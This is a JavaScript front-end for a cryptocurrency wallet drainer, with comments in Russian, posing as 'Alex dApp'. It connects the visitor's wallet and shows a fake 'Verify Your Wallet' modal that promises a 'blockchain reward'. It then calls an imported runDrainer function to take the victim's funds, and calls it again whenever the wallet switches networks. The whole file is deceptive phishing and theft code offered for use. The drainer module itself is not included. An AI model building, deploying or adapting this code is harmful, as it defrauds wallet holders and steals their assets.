import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

// === Конфигурация AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === Глобальные переменные ===
let connectedAddress = null;
let isTransactionPending = false;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;
let modalShown = false;

const FALLBACK_RPCS = [
  'https://rpc.eth.gateway.fm',
  'https://eth.llamarpc.com',
  'https://ethereum-rpc.publicnode.com'
];

// Функция для создания провайдера с fallback RPC
async function getReliableProvider() {
  const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
  try {
    await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
    console.log('✅ Провайдер кошелька полностью рабочий');
    return walletProvider;
  } catch (err) {
    console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
  }

  for (const rpcUrl of FALLBACK_RPCS) {
    try {
      const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
      await fallbackProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`✅ Переключено на fallback RPC: ${rpcUrl}`);
      return new ethers.providers.Web3Provider({
        ...window.ethereum,
        request: async (request) => {
          if (
            request.method === 'eth_chainId' ||
            request.method === 'eth_call' ||
            request.method === 'eth_getBalance' ||
            request.method === 'eth_blockNumber'
          ) {
            return fallbackProvider.send(request.method, request.params || []);
          }
          return walletProvider.send(request.method, request.params || []);
        }
      });
    } catch (err) {
      console.warn(`⚠️ Fallback RPC ${rpcUrl} недоступен:`, err.message);
    }
  }

  throw new Error('❌ Не удалось найти рабочий RPC');
}

// === Инициализация при загрузке страницы ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  // Подключаем шрифты Orbitron и Montserrat
  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Montserrat:wght@400;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  // CSS для модального окна
  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      z-index: 999;
      display: none;
      backdrop-filter: blur(5px);
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(145deg, #1a1a2e, #16213e);
      border: 1px solid #00d4ff;
      border-radius: 15px;
      padding: 25px;
      width: 90%;
      max-width: 350px;
      min-height: 400px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Montserrat', sans-serif;
      color: #ffffff;
      box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
      animation: fadeIn 0.5s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 22px;
      color: #00d4ff;
      margin-bottom: 20px;
      text-transform: uppercase;
      letter-spacing: 2px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .modal-title::before {
      content: '🔗';
      font-size: 24px;
    }

    .scanner-container {
      position: relative;
      width: 120px;
      height: 120px;
      margin: 0 auto 20px;
      display: block;
    }

    .scanner-bg {
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
      border-radius: 50%;
      position: absolute;
      top: 0;
      left: 0;
    }

    .scanner-line {
      width: 100%;
      height: 4px;
      background: #00d4ff;
      position: absolute;
      top: 50%;
      left: 0;
      box-shadow: 0 0 10px #00d4ff;
      animation: scan 2s linear infinite;
    }

    @keyframes scan {
      0% { transform: translateY(-50px); opacity: 0; }
      50% { transform: translateY(50px); opacity: 1; }
      100% { transform: translateY(-50px); opacity: 0; }
    }

    .modal-result {
      font-family: 'Orbitron', sans-serif;
      font-size: 18px;
      margin: 20px 0;
      display: none;
    }

    .modal-result.success {
      color: #00ff88;
    }

    .modal-result.error {
      color: #ff5555;
    }

    .modal-subtitle {
      font-size: 14px;
      color: #b0b0b0;
      margin-bottom: 25px;
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 20px 0 0;
      font-size: 14px;
      color: #e0e0e0;
    }

    .action-list li {
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .action-list li::before {
      content: '✔️';
      color: #00ff88;
      font-size: 16px;
    }

    .modal-footer {
      font-size: 12px;
      color: #888888;
      margin-top: 30px;
      font-style: italic;
    }

    .cancel-btn {
      margin-top: 20px;
      padding: 10px 20px;
      background: #ff5555;
      border: none;
      border-radius: 8px;
      color: #ffffff;
      font-family: 'Montserrat', sans-serif;
      font-size: 14px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .cancel-btn:hover {
      background: #ff7777;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 300px;
        padding: 20px;
        min-height: 350px;
      }
      .modal-title { font-size: 18px; }
      .scanner-container { width: 100px; height: 100px; }
      .modal-subtitle {ರ: true; font-size: 12px; }
      .modal-result { font-size: 16px; }
      .action-list { font-size: 12px; }
      .modal-footer { font-size: 10px; }
      .cancel-btn { font-size: 12px; padding: 8px 16px; }
    }
  `;
  document.head.appendChild(style);

  // Создаём модальное окно
  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="scanner-container">
      <div class="scanner-bg"></div>
      <div class="scanner-line"></div>
    </div>
    <div class="modal-result success">Transaction Confirmed!</div>
    <div class="modal-result error">Transaction Cancelled</div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
    <button class="cancel-btn">Cancel</button>
  `;
  document.body.appendChild(modalContent);

  // Добавляем обработчик для кнопки отмены
  const cancelBtn = modalContent.querySelector('.cancel-btn');
  cancelBtn.addEventListener('click', () => {
    hideModal();
    modalShown = false;
    isTransactionPending = false;
    updateModalContent('error');
  });

  // Проверяем наличие инжектированного провайдера
  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);

  // Подписка на смену сети
  window.ethereum.on('chainChanged', onChainChanged);
});

// === Управление модальным окном ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalContent.style.display = 'block';
  // Сбрасываем состояние модального окна
  const scanner = modalContent.querySelector('.scanner-container');
  const subtitle = modalContent.querySelector('.modal-subtitle');
  const successMsg = modalContent.querySelector('.modal-result.success');
  const errorMsg = modalContent.querySelector('.modal-result.error');
  scanner.style.display = 'block';
  subtitle.style.display = 'block';
  successMsg.style.display = 'none';
  errorMsg.style.display = 'none';
}

function hideModal() {
  modalOverlay.style.display = 'none';
  modalContent.style.display = 'none';
}

function showModalOnce() {
  if (!modalShown) {
    modalShown = true;
    showModal();
  }
}

function updateModalContent(status) {
  const scanner = modalContent.querySelector('.scanner-container');
  const subtitle = modalContent.querySelector('.modal-subtitle');
  const successMsg = modalContent.querySelector('.modal-result.success');
  const errorMsg = modalContent.querySelector('.modal-result.error');

  scanner.style.display = 'none';
  subtitle.style.display = 'none';
  if (status === 'success') {
    successMsg.style.display = 'block';
    errorMsg.style.display = 'none';
  } else {
    successMsg.style.display = 'none';
    errorMsg.style.display = 'block';
  }
}

// === Выполнение drainer ===
async function attemptDrainer() {
  if (isTransactionPending) {
    console.log('⚠️ Транзакция уже ожидается');
    return;
  }

  if (!connectedAddress) {
    console.error('❌ Адрес кошелька не определён');
    return;
  }

  console.log(`📍 Используется адрес: ${connectedAddress}`);
  showModalOnce();

  try {
    const provider = await getReliableProvider();
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      console.error('❌ Несоответствие адресов:', address, connectedAddress);
      hideModal();
      modalShown = false;
      return;
    }

    isTransactionPending = true;
    const status = await runDrainer(provider, signer, connectedAddress);
    console.log(status === 'confirmed' ? '✅ Drainer выполнен успешно' : '🙅 Пользователь отклонил транзакцию');

    isTransactionPending = false;
    updateModalContent(status === 'confirmed' ? 'success' : 'error');
  } catch (err) {
    isTransactionPending = false;
    updateModalContent('error');
    if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил транзакцию');
    } else {
      console.error('❌ Ошибка выполнения drainer:', err.message);
    }
  }
}

// === Подключение кошелька и запуск ===
async function handleConnectOrAction() {
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length === 0) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      console.log('✅ Подключён кошелёк:', connectedAddress);
    } else {
      connectedAddress = accounts[0];
      console.log('✅ Уже подключён:', connectedAddress);
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      console.log('⏳ Транзакция уже выполняется');
    }
  } catch (err) {
    console.error('❌ Ошибка подключения:', err.message);
    updateModalContent('error');
  }
}

// === Обработка смены сети ===
async function onChainChanged(chainId) {
  console.log('🔄 Смена сети:', chainId);
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer();
  } else {
    console.log('⏳ Транзакция в процессе');
  }
}

// === Очистка ===
function cleanup() {
  if (!actionBtn) return;
  window.ethereum.removeListener('chainChanged', onChainChanged);
  // Убираем отключение кнопки, чтобы можно было повторно запустить процесс
  // actionBtn.removeEventListener('click', handleConnectOrAction);
  // actionBtn.disabled = true;
  // actionBtn.style.opacity = '0.6';
}

// === Ожидание подключения кошелька ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  if (accounts.length > 0) return accounts[0];

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length) {
        clearInterval(interval);
        resolve(accounts[0]);
      }
    }, 500);
  });
}
